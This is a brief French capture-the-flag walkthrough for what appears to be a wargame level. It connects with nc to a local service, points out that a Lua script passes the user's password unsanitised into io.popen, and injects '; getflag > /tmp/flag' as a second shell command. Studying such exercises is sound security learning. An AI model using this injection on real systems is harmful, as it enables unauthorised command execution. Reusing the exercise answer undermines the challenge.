lancer la commande

nc localhost 5151

on nous demande un pwd

on vois dans level11.lua que popen est use

prog = io.popen("echo "..pass.." | sha1sum", "r")

le pwd est envoyer dans la variable pass

on abuse donc de celui comme suit:


; getflag > /tmp/flag